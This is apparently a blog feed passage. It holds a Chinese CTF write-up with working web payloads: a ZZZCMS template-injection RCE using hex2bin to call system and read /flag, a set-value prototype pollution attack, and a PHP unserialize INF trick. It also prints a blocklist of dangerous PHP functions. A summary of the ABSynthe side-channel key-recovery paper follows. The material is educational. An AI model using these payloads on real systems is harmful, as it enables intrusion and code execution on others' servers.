);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>简单搜了下，发现是ZZZCMS源码的一部分，参考链接如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cloud.tencent.com/developer/article/1576196</span><br></pre></td></tr></table></figure></p><p>但是通过diff，发现这里的过滤比ZZZCMS多一些：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$danger=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br></pre></td></tr></table></figure></p><p>参考到这篇文章：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://forum.90sec.com/t/topic/1239</span><br></pre></td></tr></table></figure></p><p>其exp如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span>:array_map(base_convert(<span class="number">27440799224</span>,<span class="number">10</span>,<span class="number">32</span>),<span class="keyword">array</span>(<span class="number">1</span>))&#125;&#123;end <span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p><p>考虑该题过滤了base_convert函数，这里想一个新的bypass方案，尝试使用hex2bin:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span>:array_map(hex2bin(<span class="string">'73797374656d'</span>),<span class="keyword">array</span>(<span class="string">'ls'</span>))&#125;&#123;end <span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p><p>搭配使用system函数，即可rce获取flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:array_map(hex2bin(&apos;73797374656d&apos;),array(&apos;cat /flag&apos;))&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure></p><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zed3ztpomt9lasf47o6.cloudeci1.ichunqiu.com/?a=&#123;if:array_map(hex2bin(%2773797374656d%27),array(%27cat%20/flag%27))&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-20-15-28-47.png" alt=""></p><h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><p>题目给了源码，简单看一下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">'set-value'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> COMMODITY = &#123;</span><br><span class="line">    <span class="string">"sword"</span>: &#123;<span class="string">"Gold"</span>: <span class="string">"20"</span>, <span class="string">"Firepower"</span>: <span class="string">"50"</span>&#125;,</span><br><span class="line">    <span class="comment">// Times have changed</span></span><br><span class="line">    <span class="string">"gun"</span>: &#123;<span class="string">"Gold"</span>: <span class="string">"100"</span>, <span class="string">"Firepower"</span>: <span class="string">"200"</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> MOBS = &#123;</span><br><span class="line">    <span class="string">"Lv1"</span>: &#123;<span class="string">"Firepower"</span>: <span class="string">"1"</span>, <span class="string">"Bounty"</span>: <span class="string">"1"</span>&#125;,</span><br><span class="line">    <span class="string">"Lv2"</span>: &#123;<span class="string">"Firepower"</span>: <span class="string">"5"</span>, <span class="string">"Bounty"</span>: <span class="string">"10"</span>&#125;,</span><br><span class="line">    <span class="string">"Lv3"</span>: &#123;<span class="string">"Firepower"</span>: <span class="string">"10"</span>, <span class="string">"Bounty"</span>: <span class="string">"15"</span>&#125;,</span><br><span class="line">    <span class="string">"Lv4"</span>: &#123;<span class="string">"Firepower"</span>: <span class="string">"20"</span>, <span class="string">"Bounty"</span>: <span class="string">"30"</span>&#125;,</span><br><span class="line">    <span class="string">"Lv5"</span>: &#123;<span class="string">"Firepower"</span>: <span class="string">"50"</span>, <span class="string">"Bounty"</span>: <span class="string">"65"</span>&#125;,</span><br><span class="line">    <span class="string">"Lv6"</span>: &#123;<span class="string">"Firepower"</span>: <span class="string">"80"</span>, <span class="string">"Bounty"</span>: <span class="string">"100"</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> BOSS = &#123;</span><br><span class="line">    <span class="comment">// Times have not changed</span></span><br><span class="line">    <span class="string">"Firepower"</span>: <span class="string">"201"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">"password1"</span>:process.env.p1,</span><br><span class="line">    <span class="string">"password2"</span>:process.env.p2,</span><br><span class="line">    <span class="string">"password3"</span>:process.env.p3</span><br><span class="line">&#125;</span><br><span class="line">router.post(<span class="string">'/BuyWeapon'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    res.send(<span class="string">"BOOS has said 'Times have not changed'!"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">'/EarnBounty'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    res.send(<span class="string">"BOOS has said 'Times have not changed'!"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">'/ChallengeBOSS'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    res.send(<span class="string">"BOOS has said 'Times have not changed'!"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">"/DeveloperControlPanel"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">"What's your problem?"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">"Wrong password!Are you Admin?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">'/SpawnPoint'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.knight = &#123;</span><br><span class="line">        <span class="string">"HP"</span>: <span class="number">1000</span>,</span><br><span class="line">        <span class="string">"Gold"</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="string">"Firepower"</span>: <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">"Let's begin!"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">"/Privilege"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Why not ask witch for help?</span></span><br><span class="line">    <span class="keyword">if</span>(req.session.knight === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">'/SpawnPoint'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.NewAttributeKey === <span class="literal">undefined</span> || req.body.NewAttributeValue === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"What's your problem?"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.NewAttributeKey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.NewAttributeValue.toString();</span><br><span class="line">            setFn(req.session.knight, key, value);</span><br><span class="line">            res.send(<span class="string">"Let's have a check!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure></p><p>首先看如何获取flag：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">"/DeveloperControlPanel"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">"What's your problem?"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">"Wrong password!Are you Admin?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>发现只要：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">    res.send(process.env.flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>即可获取flag。这里不难发现：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">'set-value'</span>);</span><br></pre></td></tr></table></figure></p><p>存在原型链污染的问题，查看调用处：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">"/Privilege"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Why not ask witch for help?</span></span><br><span class="line">    <span class="keyword">if</span>(req.session.knight === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">'/SpawnPoint'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.NewAttributeKey === <span class="literal">undefined</span> || req.body.NewAttributeValue === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"What's your problem?"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.NewAttributeKey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.NewAttributeValue.toString();</span><br><span class="line">            setFn(req.session.knight, key, value);</span><br><span class="line">            res.send(<span class="string">"Let's have a check!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>发现key和value都可控，那就好办了，这里直接进行污染：<br><img src="/images/2020-08-20-17-04-56.png" alt=""><br>然后去获取flag：<br><img src="/images/2020-08-20-17-05-11.png" alt=""></p><h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>题目给出了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">'trick'</span>]);</span><br></pre></td></tr></table></figure></p><p>题目考察了一个小trick，要求2个变量不相等，但md5相同，以往都需要使用诸如如下工具进行爆破：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/upbit/clone-fastcoll</span><br></pre></td></tr></table></figure></p><p>这里由于有长度限制，我们可以使用trick：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1=INF;</span><br><span class="line">    <span class="keyword">public</span> $trick2=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$exp = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="keyword">echo</span> serialize($exp);</span><br></pre></td></tr></table></figure></p><p>即可进行bypass，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze6ie6rtdjhwozbsgmd.cloudeci1.ichunqiu.com/?trick=O:5:%22trick%22:2:&#123;s:6:%22trick1%22;d:INF;s:6:%22trick2%22;d:INF;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-20-19-49-58.png" alt=""><br>即可获取flag.</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>线上赛的web题还是比较简单的，可能是因为考虑参赛面广，入围资格也多吧= =……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;周末参加了一下国赛，有两年没参与了，还是一如既往的“吓人”，XD&lt;/p&gt;
&lt;h2 id=&quot;babyunserialize&quot;&gt;&lt;a href=
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; ABSynthe &amp;  Automatic Blackbox Side-channel Synthesis onCommodity Microarchitectures</title>
    <link href="http://skysec.top/2020/08/11/Paper-Summary-ABSynthe-Automatic-Blackbox-Side-channel-Synthesis-on-Commodity-Microarchitectures/"/>
    <id>http://skysec.top/2020/08/11/Paper-Summary-ABSynthe-Automatic-Blackbox-Side-channel-Synthesis-on-Commodity-Microarchitectures/</id>
    <published>2020-08-11T01:44:26.000Z</published>
    <updated>2020-08-17T08:15:23.049Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章是发表在NDSS2020上，有关于微架构侧信道攻击的一篇文章。一作来自于英特尔公司，先前在硬件和底层上有比较多的研究。文章标题中的几个关键词，也在文章中有一定的体现，比如自动化、黑盒，合成等，这些都与一些现有的工作有比较大的差异。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>CPU组件存在大量的侧信道攻击，但现有的每一种侧信道攻击方式，几乎都基于白盒分析的方法。通常情况下，需要3步来完成：</p><ol><li>首先需要能够识别出这一特定的CPU组件。</li><li>然后需要在特定的微架构上对其做逆向分析。</li><li>最后通过逆向分析得到的内容，人工构造指令序列，用以侧信道泄露信息。<br>但这些方法通常都存在一些弊端，由于现有的侧信道攻击需要人工构造指令序列，而CPU会使用微架构组件来实现其指令集，并且这些微架构组件的底层细节不可见，因此需要逆向工程进行分析。随着CPU的更新换代，这些组件的数量，大小，复杂性都在增加，同时这些组件的属性可以在CPU版本之间发生变化，因此会对侧信道研究人员带来新的且冗长的逆向工作。<br>同时，除去对于逆向工程的复杂性，当想要对目标程序进行侧信道攻击时，还需要对该软件有比较好的了解，清楚感兴趣的内容，其代码执行路径在何处。这一切都对攻击者有比较高的要求。除此之外，由于这些方法基于已有信息，那么对于那些未知的共享资源或者信息，则无法进行攻击。<br>在此基础上，作者提出了黑盒分析的思路，他们将CPU组件当做黑盒，无需进行逆向分析。并且可以自动的找到目标软件可能感兴趣的内容的代码执行路径。文章的核心思路利用了共享资源被争用和不被争用时，会存在可测量的性能差异这一现象进行侧信道分析。<br>同时本篇文章的工作可以自动的优化出在侧信道获取信息时，性能表现最好的指令序列，无需人工参与构造指令序列，并可以利用神经网络从侧信道攻击的结果中恢复密钥。</li></ol><h2 id="工具设计"><a href="#工具设计" class="headerlink" title="工具设计"></a>工具设计</h2><p>作者以从受害者进程或者虚拟机中泄露诸如密钥等敏感数据为目的，提出了这样一种威胁模型：</p><ol><li>攻击者可以在受害者的机器上执行代码</li><li>攻击者和受害者位于同一CPU核心上执行代码</li><li>所有最先进的侧信道保护都已启用</li><li>目标软件存在侧信道攻击的威胁<br>由于作者提出的侧信道攻击的核心思路是利用共享资源在被争用和不被争用时，会存在可测量的性能差异。<br>对于2条可能存在资源争用的指令，作者将写指令称为A指令，读指令称为B指令，通过使用A指令来尝试引起B指令的延迟变化，用以判断是否存在资源争用的情况。<br>如下图，在writer指令执行时和不执行时，reader指令信号会存在明显的差异性。<br><img src="/images/2020-08-11-10-21-57.png" alt=""><br>这里作者尝试找出2条存在可观察的资源争用信号的指令，与以往工作中人工精心挑选指令不同，这里作者通过遍历X86_64指令集来寻找最合适用于侧信道攻击的指令。这里的指令集来自于uops.info的项目。<br>为了评估结果，作者建立了一个矩阵，用来反应指令B在指令A的影响下所出现的延迟相较于指令B在空指令下的延迟比例。如果延迟比大于1，那么说明指令A和B会存在资源争用的情况。<br>作者对指令列表中的指令进行了一次二层嵌套for循环，用以寻找所有指令两两之间延迟比大于1的情况，从而找到所有存在资源竞争的指令对。<br>为了将结果可视化的展现，作者将指令按照其使用的执行端口进行分组。按照执行端口分组的原因有2点：</li><li>执行端口本身就是一种被争用的资源</li><li>可以将相似功能的指令组合在一起<br>从实验结果我们可以发现:<br><img src="/images/2020-08-11-10-24-17.png" alt=""></li><li>共享执行端口的指令不一定都是高争用，也可能是无争用的。例如skylake中P1端口。</li><li>不共享执行端口的指令一般显示低争用，但也有存在高争用的，这意味着共享资源不仅只有执行端口，可能还有其他资源。例如Xeon的P1和P5，P0和P5。<br>通过比对在3种不同微架构上指令对在执行端口争用上的表现，作者总结出3个结论：</li><li>可能存在多个资源有争用问题，并非只有执行端口</li><li>在某个微架构上表现较好的基于资源争用的侧信道攻击，可能在其他微架构上不一定有效</li><li>性能表现最好的基于资源争用的侧信道攻击可能需要多个指令来引起资源争用<br>在可以找到引起资源争用的指令对后，下面来介绍一下工具设计的架构。<br>工具可以分为2个部分，一个是分析阶段，一个是攻击阶段。<br><img src="/images/2020-08-11-10-31-12.png" alt=""><br>在分析阶段，将微架构和目标软件作为输入，通过Ground Truth引擎自动对其插入指令，每当其进行密钥操作时，就会与侧信道监听程序同步，发送与密钥相关的信号数据。<br>侧信道攻击的代码Spy code最初来自于微架构的leakage map，对于leakage map每一个性能表现比较好的指令，侧信道监听程序会将它们资源争用的度量发送给合成引擎。而合成引擎则通过评估指令产生的资源争用信号，来生成可以触发更高信号质量的指令序列，循环往复，直到合成引擎生成的指令序列可以以足够高的可信度探测到密钥信息。<br>在攻击阶段，利用分析阶段得到的优化后的指令序列进行侧信道攻击，并将获取的信息传递给密钥恢复引擎，用以恢复目标程序密钥。<br>在进行上述方法实现时，会遇到3个挑战：</li><li>在分析阶段时，工具需要自动对目标软件进行指令插入，用以和侧信道攻击代码同步测量，收集密钥相关的真实数据，那么如何自动化的找到密钥相关的控制流分支是一个难点。</li><li>在分析阶段时，如何自动的优化侧信道攻击代码</li><li>在攻击阶段时，如何通过侧信道攻击的结果去恢复密钥信息<br>那么对于第一点如何自动化插入指令的难题，作者使用了污点分析与火焰图的技术。对于第二点如何自动化优化攻击代码的难题，作者采用基于高斯朴素贝叶斯分类器的差分进化遗传算法来作为评估方法用以自动化优化指令序列。对于第三点如何恢复密钥，作者使用了RNN分类器。具体内容我们将在下一节展开。</li></ol><h2 id="工具实现"><a href="#工具实现" class="headerlink" title="工具实现"></a>工具实现</h2><p>前面有提到，第一个难题就是如何自动化的进行指令插入，那么指令插入肯定不能随意乱做，我们需要找到感兴趣的代码路径，在其前后插入相应指令。而本文的针对攻击目标是加密函数，因此如何自动化的找到密钥相关的代码分支，就是一个难题。<br>这里作者选择使用污点分析来找到这些指令的插入位置，而后结合火焰图来自动的找出密钥相关的分支。<br>首先简单介绍一下火焰图的概念：<br><img src="/images/2020-08-11-10-43-40.png" alt=""><br>假设我们程序中需要执行main函数，main函数自身的CPU执行时间为2秒，而main函数中又调用了foo1和foo2函数，因此我们需要去计算foo1和foo2的执行时间，才能得到main的完整执行时间。<br>此时我们会去看foo1和foo2函数的调用时间，首先foo1函数自身的cpu执行时间为1.5秒，但由于其调用了bar函数，我们又需要再去看bar函数，才能计算出foo1的完整cpu执行时间。<br>此时看到bar函数，发现bar函数不再调用其他函数，其自身的cpu执行时间为2.5秒，因此我们可以算出foo1的完整cpu执行时间为其本身的1.5和bar函数的2.5之和，就是4秒。<br>那么同理，我们也可以算出foo2函数的完整执行时间为3秒，因此main函数的完整执行时间为自身的执行时间，加上foo1的时间，再加上foo2的时间，即9秒。<br>这一函数调用过程我们将其画成火焰图，如下图所示。<br><img src="/images/2020-08-11-10-46-16.png" alt=""><br>回到工具中，这里工具ABSynthe首先会将密钥文件中的所有数据标注为污点，进行污点分析。然后使用perf record来获取目标程序所有函数的火焰图，找到其中具有显著执行时间的函数，看其是否被我们的污点标注过，如果标注过，则在这些函数位置插入指令。<br>如下图中：<br><img src="/images/2020-08-11-10-48-55.png" alt=""><br>其中scalar是被标注成污点的密钥变量，第4行为密钥相关分支。第2和5行为我们嵌入的指令。<br><img src="/images/2020-08-11-10-49-06.png" alt=""><br>每当该分支被执行时，CRYPTLOOP_VALUE会发出信号，往共享内存中写入一个值，然后侧信道程序除了搜集侧信号信号以外，还会读取该值，用于后续的训练。<br>在搜集信息时，同样会存在难点，由于同步传输数据，本身就会产生噪音，影响侧信道的测量。<br>这里为了避免这一问题，作者使用了软同步策略，利用一个内存共享页来实现共享内存通道。同时让spy code持续监视目标共享内存位置，并将每个延迟测量值标记为样本值。<br>那么对于第2个难题，如果想造成一次效果较好的侧信道攻击，那么执行的指令序列的构造非常重要，之前的工作这一构造通常由人工完成。而在本篇文章里，作者使用差分进化算法来自动化的优化构造指令序列，该算法的输入为可以在微架构组件上产生资源争用的指令，这里作者选择了性能表现最好的指令作为种子。<br>同时作者希望算法可以自由的选择最终的指令序列，但又希望其生成的指令序列是有效的，因此作者提前设计了一种配方，让算法在寻找性能最好的指令序列时，对这些配方进行mutate。<br><img src="/images/2020-08-11-10-53-03.png" alt=""><br>首先我们来看一下配方的构成，第一个参数是Repeat number，这一参数用来定义指令序列需要执行的次数，范围为1~20次。指令序列的执行时间可以作为探测目标程序密钥操作的一种信号，执行时间需要在可观测和高分辨率中做一个衡量，因此指令序列执行次数非常重要。<br><img src="/images/2020-08-11-10-54-22.png" alt=""><br>第2、3参数代表是否在执行指令序列前或执行指令序列后存在内存屏障。如果存在内存屏障，可以保证内存通信时，不会因为乱序执行而使测量时间的指令出现噪音。但相应的，也可能会降低指令序列执行时间的分辨率。因此需要将这一参数保留，让算法来选择是否要其存在。<br>第4、5、6、7参数是用于来创建资源争用的。每个参数定义了特定信道所需的指令数量。<br><img src="/images/2020-08-11-10-57-52.png" alt=""><br>最后位置的参数用来规定使用哪种方式将指令块合并到一起。这里作者提出了3种合并方式：</p><ol><li>串联，即将简单的将配方中的指令块连接在一起。</li><li>交错，即将来自不同块的指令交错连接在一起。</li><li>串联后的随机洗牌，即将配方中的指令块简单连接在一起后，再进行随机洗牌<br><img src="/images/2020-08-11-10-59-41.png" 